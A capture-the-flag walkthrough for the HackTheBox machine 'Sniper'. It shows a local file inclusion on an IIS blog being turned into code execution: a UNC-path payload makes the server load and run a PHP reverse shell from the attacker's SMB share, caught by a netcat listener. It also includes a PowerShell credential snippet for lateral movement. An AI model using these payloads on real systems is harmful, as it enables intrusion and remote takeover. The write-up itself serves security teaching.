# Sniper — HackTheBox Walkthrough

**Platform:** HackTheBox
**Difficulty:** Medium
**OS:** Windows

---

## TL;DR

Web enumeration reveals a `/blog` directory with a vulnerable `lang` parameter → We discover a Local File Inclusion (LFI) vulnerability using absolute paths → To escalate LFI to RCE on Windows, we host a malicious PHP reverse shell on an open SMB share on our attacking machine → We use the LFI vulnerability to include our remote file via a UNC path, forcing the server to execute our PHP payload and granting us an initial reverse shell.

---

## Enumeration

Full nmap scan:

```bash
nmap -sC -sV -p- -n -Pn --min-rate=9018 10.10.10.151
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 80 | HTTP | Microsoft IIS httpd 10.0 |
| 135 | RPC | Microsoft Windows RPC |
| 139 | NetBIOS | Microsoft Windows netbios-ssn |
| 445 | SMB | microsoft-ds |

The target is a Windows machine running an IIS web server on port 80. The SMB service is exposed, but anonymous access is denied. We focus our enumeration on the web application.

Port 80 hosts the website for "Sniper Co.". Exploring the site, we find a `/blog` directory. Within the blog, there is an option to change the display language. Clicking on a language modifies the URL to include a `lang` parameter:
`http://10.10.10.151/blog/?lang=blog-en.php`

---

## Exploitation — LFI to RCE via SMB

The `lang` parameter directly references a `.php` file, which is a classic indicator of a potential Local File Inclusion (LFI) vulnerability. 

We test for LFI using standard directory traversal payloads (e.g., `..\..\..\..\windows\win.ini`), but they fail. 
However, using an absolute path successfully returns the file contents:
`http://10.10.10.151/blog/?lang=\windows\win.ini`

While we can read local files, establishing a foothold requires Remote Code Execution (RCE). On Linux systems, LFI is often escalated to RCE by poisoning logs (like SSH or Apache access logs). On modern Windows IIS environments, those logs are typically locked or difficult to access.

However, PHP on Windows supports **UNC paths** (Universal Naming Convention). This means we can instruct the `include()` or `require()` function in the vulnerable PHP code to fetch a file from a remote SMB share on our attacking machine rather than a local disk.

First, we set up an open SMB share on our Kali Linux attacking machine. We edit the `/etc/samba/smb.conf` file to add a completely open share:

```ini
[HTB]
   comment = HTB Share
   path = /srv/smb
   guest ok = yes
   browseable = yes
   create mask = 0600
   directory mask = 0700
```

We restart the SMB service so the changes take effect:

```bash
sudo systemctl restart smbd
```

Next, we place a standard PHP reverse shell (e.g., Ivan Sincek's) into the `/srv/smb` directory and name it `php-reverse-shell.php`. We edit the shell to point back to our Kali IP and a listener port (e.g., 4444).

We start a Netcat listener on port 4444:
```bash
nv -lnvp 4444
```

Finally, we trigger the LFI payload on the target server, using the UNC path to point to our newly created SMB share:

```text
http://10.10.10.151/blog/?lang=\\10.10.14.32\HTB\php-reverse-shell.php
```

The IIS server navigates to our SMB share, grabs `php-reverse-shell.php`, and blindly executes the PHP code. 

Our Netcat listener catches the incoming connection. We have an initial foothold on the machine!

*Note: The rest of the privilege escalation steps involve abusing internal credentials and PowerShell remoting (e.g., `Invoke-Command`), as hinted by the `New Learn` notes.*

---

## Key Takeaways

- **Windows LFI to RCE:** Escalating local file inclusion to code execution on Windows IIS is notoriously tricky compared to Linux. Using UNC paths to force the server to load a remote PHP file via SMB is an elegant and highly effective bypass for log-poisoning restrictions.
- **PowerShell Credential Objects:** When moving laterally or escalating privileges on Windows, storing credentials securely as a `PSCredential` object allows you to natively execute commands as another user without needing external tools like `psexec` or `winexe`:
```powershell
$pass = ConvertTo-SecureString "Password123" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("Domain\User", $pass)
Invoke-Command -ComputerName TargetMachine -Credential $cred -ScriptBlock { whoami }
```

---

*Thanks for reading! Follow for more HackTheBox walkthrough content.*